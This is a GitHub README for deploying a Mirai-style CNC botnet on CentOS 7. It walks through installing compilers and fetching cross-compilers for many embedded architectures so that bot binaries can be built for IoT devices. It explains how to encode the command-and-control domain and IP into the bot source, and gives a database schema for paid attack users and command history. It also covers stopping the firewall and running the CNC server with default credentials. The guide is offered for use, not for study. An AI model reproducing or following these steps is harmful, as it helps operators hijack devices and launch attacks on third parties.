# 🌟 CNC Botnet Setup 🌟

<div align="center">
  
![CNC Botnet](https://img.shields.io/badge/CNC-Botnet-8A2BE2?style=for-the-badge)
![CentOS](https://img.shields.io/badge/CentOS-7-4B8BBE?style=for-the-badge&logo=centos&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Active-success.svg?style=for-the-badge)

</div>



A comprehensive guide to setting up a CNC botnet on CentOS 7. Follow the steps below to get your botnet up and running.

## ✨ Features

<div align="center">
  <table>
    <tr>
      <td>
        <h3>📦 Installation</h3>
        <ul>
          <li>Automated setup of required tools and dependencies</li>
          <li>Download and extract cross-compilers</li>
          <li>Configure environment variables</li>
        </ul>
      </td>
      <td>
        <h3>🔧 Configuration</h3>
        <ul>
          <li>Setup MariaDB for database management</li>
          <li>Configure CNC and botnet settings</li>
          <li>Compile and run the CNC server</li>
        </ul>
      </td>
    </tr>
    <tr>
      <td colspan="2">
        <h3>💻 Usage</h3>
        <ul>
          <li>Connect to the botnet using clients like Putty/Mobaxterm/Kitty/Ubuntu</li>
          <li>Manage the botnet via the CNC server</li>
          <li>Monitor and control bot activities</li>
        </ul>
      </td>
    </tr>
  </table>
</div>

## 📥 Installation

```bash
# Make sure to use CentOS 7 as your main botnet hosting OS

# Copy and paste this code into your terminal all at once:

yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y

cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz

export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

source ~/.bash_profile

go version
go env

cd ~/
mkdir /etc/xcompile
cd /etc/xcompile

wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2

tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2

rm -rf *.tar.bz2
rm -rf *.tar.gz

mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
```

## 🔧 Configuration

### Domain Setup

1. Use the `enc.c` file to encode your domain.
2. Compile the `enc.c` file:
   ```bash
   gcc enc.c -o enc
   ```
3. Use it like this:
   ```bash
   ./enc string example.com
   ```
4. Copy the generated string and paste it into `/bot/table.c` at lines 20 and 21.

### IP Configuration

1. Change the IP in `/cnc/main.go` line 19 to your VPS IP.
2. Change the IP in `/bot/headers/includes.h` line 27 to your VPS IP.

### Database Setup

1. Install and start MariaDB:
   ```bash
   yum install mariadb-server -y
   service mariadb restart
   ```
2. Secure MariaDB installation:
   ```bash
   mysql_secure_installation
   ```
3. Log in to MariaDB:
   ```bash
   mysql -u root -p
   ```
4. Create and configure the database:
   ```sql
   CREATE DATABASE vagner;

   USE vagner;

   CREATE TABLE `history` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `user_id` int(10) unsigned NOT NULL,
     `time_sent` int(10) unsigned NOT NULL,
     `duration` int(10) unsigned NOT NULL,
     `command` text NOT NULL,
     `max_bots` int(11) DEFAULT '-1',
     PRIMARY KEY (`id`),
     KEY `user_id` (`user_id`)
   );

   CREATE TABLE `users` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `username` varchar(32) NOT NULL,
     `password` varchar(32) NOT NULL,
     `duration_limit` int(10) unsigned DEFAULT NULL,
     `cooldown` int(10) unsigned NOT NULL,
     `wrc` int(10) unsigned DEFAULT NULL,
     `last_paid` int(10) unsigned NOT NULL,
     `max_bots` int(11) DEFAULT '-1',
     `admin` int(10) unsigned DEFAULT '0',
     `intvl` int(10) unsigned DEFAULT '30',
     `api_key` text,
     PRIMARY KEY (`id`),
     KEY `username` (`username`)
   );

   CREATE TABLE `whitelist` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `prefix` varchar(16) DEFAULT NULL,
     `netmask` tinyint(3) unsigned DEFAULT NULL,
     PRIMARY KEY (`id`),
     KEY `prefix` (`prefix`)
   );

   INSERT INTO users VALUES (NULL, 'root', 'elite', 0, 0, 0, 0, -1, 1, 30, '');
   ```

### Database Configuration

1. Set the database password in `/cnc/main.go` line 19:
   ```go
   const DatabasePass string = "your_database_password"
   ```

### Final Steps
1. Restart and disable services:
   ```bash
   service iptables stop
   service httpd restart
   service mariadb restart
   ```
2. Compile the bot and screen the CNC server:
   ```bash
   cd ~/
   chmod 777 *
   sh build.sh
   ```
3. Run the CNC server:
   ```bash
   screen -dm ./admin
   ```
   or
   ```bash
   screen -S cnc ./admin
   ```
   then press `ctrl + a + d`

## 💻 Usage

### Connecting to the Botnet

1. Download a client like Putty/Mobaxterm/Kitty/Ubuntu [Putty](https://putty.org/)
2. Connect using the following details:
   - CNC port: `1337`
   - CNC security code: `vagner`
   - Bot port: `1337`
   - Bot folder: `/var/www/html/bins`

## 🔗 Connect with the Developer

<div align="center">
  
[![GitHub](https://img.shields.io/badge/GitHub-Ally--Released-181717?style=for-the-badge&logo=github)](https://github.com/Ally-Released)
[![Discord](https://img.shields.io/badge/Discord-demons__arc-7289DA?style=for-the-badge&logo=discord)](https://discord.gg/tqcSc3qV3R)
[![YouTube](https://img.shields.io/badge/YouTube-Ally--released-FF0000?style=for-the-badge&logo=youtube)](https://www.youtube.com/@Ally-released)
[![Instagram](https://img.shields.io/badge/Instagram-sparkling.soul.aura-E4405F?style=for-the-badge&logo=instagram)](https://www.instagram.com/sparkling.soul.aura/)
[![Twitter](https://img.shields.io/badge/Twitter-Iamnotlol2-1DA1F2?style=for-the-badge&logo=twitter)](https://x.com/Iamnotlol2)
[![BlueSky](https://img.shields.io/badge/BlueSky-lulzsec--ally.bsky.social-3B82F6?style=for-the-badge&logo=bluesky)](https://bsky.app/profile/lulzsec-ally.bsky.social)

</div>

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgements

- [uclibc](https://www.uclibc.org/) for providing the cross-compilers

---

<div align="center">
  <p>Made with ❤️ by ALLY</p>
  <p>⭐ Star this repository if you find it useful! ⭐</p>
</div>
